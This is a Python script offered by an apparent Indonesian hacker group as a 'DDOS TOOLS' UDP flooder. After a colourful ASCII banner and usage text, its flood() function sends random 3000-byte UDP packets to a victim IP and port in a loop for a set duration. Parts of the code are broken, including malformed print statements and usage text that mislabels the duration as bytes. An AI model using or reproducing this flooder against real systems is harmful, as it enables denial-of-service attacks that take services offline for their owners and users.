
import time
import socket
import random
import sys
class bcolors:
    HEADER = '\033[95m'
    BIRU = '\033[94m'
    IJO = '\033[92m'
    KUNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ABANG ='\033[31m'

class colors:
    '''Colors class:
    Reset all colors with colors.reset
    Two subclasses fg for foreground and bg for background.
    Use as colors.subclass.colorname.
    i.e. colors.fg.red or colors.bg.green
    Also, the generic bold, disable, underline, reverse, strikethrough,
    and invisible work with the main class
    i.e. colors.bold
    '''
    reset='\033[0m'
    bold='\033[01m'
    disable='\033[02m'
    underline='\033[04m'
    reverse='\033[07m'
    strikethrough='\033[09m'
    invisible='\033[08m'
    class fg:
        black='\033[30m'
        red='\033[31m'
        green='\033[32m'
        orange='\033[33m'
        blue='\033[34m'
        purple='\033[35m'
        cyan='\033[36m'
        lightgrey='\033[37m'
        darkgrey='\033[90m'
        lightred='\033[91m'
        lightgreen='\033[92m'
        yellow='\033[93m'
        lightblue='\033[94m'
        pink='\033[95m'
        lightcyan='\033[96m'

def usage():
    print \
   bcolors.IJO + """
\033[94m ____  _           _     _      __  __      _       _ _
\033[92m|  _ \| |__   ___ | |__ (_) __ _\ \/ /_ __ | | ___ (_) |_
\033[31m|  __/| | | | (_) | |_) | | (_| |/  \| |_) | | (_) | | |_
\033[93m|_|   |_| |_|\___/|_.__/|_|\__,_/_/\_\ .__/|_|\___/|_|\__|
                        \033[92m-------------------------------\033[1m\033[31m\033[4mIndonesian BlackHat\033[0m------------------------------

                                  \033[1m\033[93mAuthor:\033[91m\033[31m\033[1m./Tsuki\033[31m

                                 \033[31mThaks \033[92mand \033[94mGreetz \033[93m\033[31mto:
                        \033[94m//SiWanna\033[92m//D3w1 4qu4\033[93m//Ms.Takyun\033[94m\033[95m//Mr.cay//
                    \033[31m//All Member \033[93mPhobiaXploit \033[92mAnd NostalgiaXploit//
-------------------------------------\033[92m\033[5mPemakaian\033[92m----------------------------------
                                   >>DDOS TOOLS<<
\033[94m\033[95m[*]\033[92m Bluebook.py \033[93mIp \033[31mPORT \033[94mBYTES\033[92m
\033[94m\033[95m>>\033[92mIP\033[93m[wajib Pake IP Yak Mas Bro]
\033[94m\033[95m>>\033[92mPORT \033[93m[Default: 80]\033[92m
\033[94m\033[95m>>\033[92mBYTES \033[93m[Data Yang Dikirim Contoh:20000]
"""

print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')

def flood(korbanmu, vport, durasi):
    # okeh kali ini kami membuat tools DDOS 
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Gunakan Dengan Bijak Yah
    bytes = random._urandom(3000)
    timeout =  time.time() + durasi
    sent = 50000

    while 1 : 
        if time.time() > timeout:
            break
        else:
            pass

        client.sendto(bytes, (korbanmu, vport))
        sent = sent + 1
        print + "[\033[94m*\033[95m]SYS[\033[92m%s\033[95m] UDP [\033[91m%s\033[0m] PORT [\033[91m%s\033[4m\033[94m proxy \033[91m]" %(sent, korbanmu, vport)
	
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))


if __name__ == '__main__':
    main()
